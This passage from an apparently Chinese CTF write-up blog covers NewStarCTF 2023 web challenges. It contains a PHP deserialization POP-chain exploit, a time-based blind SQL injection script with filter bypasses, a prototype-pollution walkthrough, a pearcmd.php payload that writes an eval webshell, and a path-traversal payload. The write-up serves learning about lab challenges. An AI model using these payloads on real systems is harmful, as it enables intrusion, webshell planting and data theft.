class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>pop链很容易构造：</p><p><code>Begin::destruct-&gt;Then::toString-&gt;Super::invoke-&gt;Handle::call-&gt;CTF::end-&gt;WhiteGod::unset</code></p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;readfile&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>()))));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里暂时不清楚system为什么读取不到flag，也不能执行ls /</p><h1 id="NewStarCTF-2023-公开赛道-midsql"><a href="#NewStarCTF-2023-公开赛道-midsql" class="headerlink" title="[NewStarCTF 2023 公开赛道]midsql"></a>[NewStarCTF 2023 公开赛道]midsql</h1><p>时间盲注，因为order by和布尔注入都不行。</p><p>过滤了空格和等号，可以分别用/**/和like绕过，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://5686ca9d-7929-475e-93b4-f47d88c70ecc.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = &#x27;1/**/and/**/if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1);#&#x27; # ctf</span></span><br><span class="line">    <span class="comment"># payload = &#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\&#x27;ctf\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(4),1);#&#x27; #items</span></span><br><span class="line">    <span class="comment"># payload = &#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\&#x27;items\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(4),1);#&#x27; #id,name,price</span></span><br><span class="line">    payload = <span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;&#125;,1))&gt;&#123;&#125;),sleep(4),1);#&#x27;</span></span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        str1 = url + payload.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time_start = time.time()</span><br><span class="line">        res = requests.get(str1)</span><br><span class="line">        <span class="built_in">print</span>(str1)</span><br><span class="line">        <span class="keyword">if</span> time.time() - time_start &gt; <span class="number">2</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-公开赛道-OtenkiGirl"><a href="#NewStarCTF-2023-公开赛道-OtenkiGirl" class="headerlink" title="[NewStarCTF 2023 公开赛道]OtenkiGirl"></a>[NewStarCTF 2023 公开赛道]OtenkiGirl</h1><p>这题应该是原型链污染，根据提示，我们查看route目录下的info.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SQL</span> = <span class="built_in">require</span>(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sql = <span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config.default&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/info/:ts?&quot;</span>, <span class="title function_">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> ctx.<span class="property">params</span>.<span class="property">ts</span> === <span class="string">&quot;undefined&quot;</span>) ctx.<span class="property">params</span>.<span class="property">ts</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="regexp">/^[0-9]+$/</span>.<span class="title function_">test</span>(ctx.<span class="property">params</span>.<span class="property">ts</span> || <span class="string">&quot;&quot;</span>) ? <span class="title class_">Number</span>(ctx.<span class="property">params</span>.<span class="property">ts</span>) : ctx.<span class="property">params</span>.<span class="property">ts</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> timestamp !== <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter ts&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">getInfo</span>(timestamp).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>有一个对路径名的过滤，不过影响不大，传数字就行了</p><p>查看submit.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有merge函数，典型的原型链污染</p><p>我们回到info.js，注意到一个重要部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，猜测flag在测试的数据中</p><p>然后这里获取sql数据的条件是不早于当前时间，因此想要获取数据，就需要把时间调早一点（因为返回的数据都是晚于最小公开时间的）</p><p>先找找最小公开时间在哪</p><p>追踪一下与config相关的两个文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">    <span class="attr">min_public_time</span>: <span class="string">&quot;2019-07-09&quot;</span>,</span><br><span class="line">    <span class="attr">server_port</span>: <span class="number">9960</span>,</span><br><span class="line">    <span class="attr">webpack_dev_port</span>: <span class="number">9970</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们的时间只要调到2019.07.09之前就行</p><p>抓包构造一下</p><img src="/2024/03/29/buuctf/buu2/image-20240407154842296.png" class="" title="image-20240407154842296"><p>刷新一下界面，发现有远古时期的标签，那就去看一看</p><p>直接hackbar随便post一个数据然后访问就行（之前提到有一个路径名过滤，只要传数字就行了）</p><img src="/2024/03/29/buuctf/buu2/image-20240407155208222.png" class="" title="image-20240407155208222"><h1 id="NewStarCTF-2023-公开赛道-Include-🍐"><a href="#NewStarCTF-2023-公开赛道-Include-🍐" class="headerlink" title="[NewStarCTF 2023 公开赛道]Include 🍐"></a>[NewStarCTF 2023 公开赛道]Include 🍐</h1><p>根据题目描述是远程文件包含漏洞</p><p>先找找环境变量有没有flag</p><img src="/2024/03/29/buuctf/buu2/image-20240407155551600.png" class="" title="image-20240407155551600"><p>提示我们去查看<code>register_argc_argv</code></p><p>发现相关功能处于On状态，然后再根据标题，猜测是要利用<code>pearcmd.php</code>进行文件包含</p><h2 id="register-argc-argv的简单作用"><a href="#register-argc-argv的简单作用" class="headerlink" title="register_argc_argv的简单作用"></a>register_argc_argv的简单作用</h2><p>它可以通过<code>$_SERVER[&#39;argv&#39;]</code>获取命令行参数，所以你会看到它现在的数据是这样的</p><img src="/2024/03/29/buuctf/buu2/image-20240407160952705.png" class="" title="image-20240407160952705"><p>在web环境下，如果想要获取多个参数，则需要用+把不同变量分隔开来（这里我懒得复现了）</p><h2 id="pearcmd-php的简单讲述"><a href="#pearcmd-php的简单讲述" class="headerlink" title="pearcmd.php的简单讲述"></a>pearcmd.php的简单讲述</h2><p>pear文件中用到了pearcmd.php文件，可以先看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_SERVER[&#39;argv&#39;]</code>可控，毕竟我们是要传参数上去的</p><p>:::info</p><p>pear一般默认安装在<code>/usr/local/lib/php</code>，不同系统的安装目录可能不同</p><p>:::</p><p>几个佬对它的详细说明我放在这了：<a href="https://blog.csdn.net/qq_52988816/article/details/127078373">dalao1</a>，<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">dalao2</a></p><p>上手！</p><p>pear命令中有一个<code>config_create</code>，根据格式<code>pear config-create [options] &lt;root path&gt; &lt;filename&gt;</code>可以这样构造：</p><p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/a.php</code></p><p>:::danger no-icon</p><p>至于为什么有个/&amp;和&amp;/，我想应该是格式要求的吧</p><p>至于为什么能直接用config-create，我想应该是之前说到的<code>register_argc_argv</code>导致的吧，毕竟是能直接把传入的数据作为参数传递</p><p>:::</p><p>这样下来构造后，大致意思就是：通过pear命令<code>config-create</code>，来包含<code>/usr/local/lib/php/pearcmd.cmd</code>文件，木马写入到<code>a.php</code>中</p><p>（有空再回头来说说为什么这么写）</p><p>然后访问a.php传参</p><img src="/2024/03/29/buuctf/buu2/image-20240407174939025.png" class="" title="image-20240407174939025"><p>:::danger</p><p>这里这里一定要用抓包放包的方式去传，而且必须要把被编码的字符给还原回来，不然php文件根本执行不了</p><p>:::</p><h1 id="NewStarCTF-2023-公开赛道-InjectMe"><a href="#NewStarCTF-2023-公开赛道-InjectMe" class="headerlink" title="[NewStarCTF 2023 公开赛道]InjectMe"></a>[NewStarCTF 2023 公开赛道]InjectMe</h1><p>点击图片发现可以跳转</p><p>查看110.jpg</p><img src="/2024/03/29/buuctf/buu2/image-20240418133152175.png" class="" title="image-20240418133152175"><p>有个对<code>.</code>的过滤，由于没有循环检测，因此可以考虑双写绕过</p><p>进入<code>download</code>路由，由于路由是由python写的，猜测源码在<code>app.py</code>里面</p><p>根据给出的<code>dockerfile</code>，发现源码复制到<code>/app</code>目录下了</p><p>可以构造payload：<code>url/download?file=....//....//....//app/app.py</code></p><p>得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    